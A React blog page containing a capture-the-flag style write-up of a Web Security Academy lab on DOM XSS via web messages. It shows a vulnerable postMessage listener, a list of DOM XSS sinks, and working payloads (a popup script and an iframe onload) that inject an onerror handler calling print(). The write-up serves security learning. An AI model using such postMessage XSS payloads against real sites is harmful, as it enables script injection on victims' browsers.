import { Container, Divider, Typography } from "@mui/material";
import Box from "@mui/material/Box";
import styles from "../../../styles/Home.module.css";
import React, { useState } from "react";
import SyntaxHighlighter from "react-syntax-highlighter";

const dom_xss_using_web_message = () => {

    const syntax_1 = `
    <script>
        window.addEventListener('message', function(e) {
            document.getElementById('ads').innerHTML = e.data;
        })
    </script>`

    const syntax_2 = `
    document.write()
    document.writeln()
    document.domain
    element.innerHTML
    element.outerHTML
    element.insertAdjacentHTML
    element.onevent`

    const syntax_3 = `
    <script>
    window.pwned=window.open('https://[LAB_ID].web-security-academy.net/');
    window.pwned.postMessage('<img src=x onerror=print()>', '*');
    </script>`

    const syntax_5 = `<iframe src="https://[LAB_ID].web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

    return (
        <Box
            className={styles.container}
            sx={{ backgroundColor: "primary.background_website" }}
            pt={5}
        >
            <Container>
                <Typography
                    sx={{
                        color: "primary.main",
                    }}
                >
                    <Typography mb={-2} variant="h2">
                    DOM XSS using Web Messages
                    </Typography>
                    <pre>2023/08/01 6:12PM</pre>
                    <Divider color="#42403f" />
                    <Typography mt={6} variant="h5">
                        Description
                    </Typography>
                    <Typography>
                    This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    This lab involves using post messages. This chrome extension is amazing and should be used when hunting for bugs. - https://github.com/fransr/postMessage-tracker. The extension monitors `postMessage listeners` by showing an indicator about the amount of listeners in the current window.
                    </Typography>
                    <Typography mt={6} variant="h5">
                        Getting Started
                    </Typography>
                    <Typography>
                    When the page we can see that the chrome extension indicates that there is 1 post message listener in the current window.
                    </Typography>
                    <img src="/dom_xss_3.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Vulnerability
                    </Typography>
                    <Typography>
                    The chrome extension is giving us the `postMessage-listener` code as well as telling us that the code is located on line 53.
                    </Typography>
                    <Box mt={5}/>
                    <Typography>
                    The code below creates a `postMessage-listener` and will take the data from the `postMessage` to be used in the sink `document.getElementById('ads').innerHTML`. This is an issue because `.innerHTML` is a sink that can be used for DOM XSS. 
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="html">
                        {syntax_1}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    *List of Sinks that can Lead to DOM-XSS*
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_2}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography mt={6} variant="h5">
                        Exploit
                    </Typography>
                    <Typography>
                    Lets craft a payload that can be used to cause the victim to execute the `print()` function. Go to the exploit sever and put the following code in the `Body`.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_3}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    JavaScript `postMessages` have the following format:
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {"targetWindow.postMessage(message, targetOrigin, [transfer]);"}
                    </SyntaxHighlighter>
                    <Box mt={5}/>
                    <Typography>
                    Now, when a user visits our website, a new window will popup and a `postMessage` is going to be sent to the vulnerable website in the context of the victim. This however will not work due to chrome blocking popups.
                    </Typography>
                    <img src="/dom_xss_2.png" style={{width: "100%", height: "100%"}}  />
                    <Box mt={5}/>
                    <Typography>
                    Since chrome is blocking popup windows, lets use an `iframe`.
                    </Typography>
                    <SyntaxHighlighter className="syntax" language="javascript">
                        {syntax_5}
                    </SyntaxHighlighter>
                    <Box pt={25}/>
                </Typography>
            </Container>
        </Box>
    );
};

export default dom_xss_using_web_message;
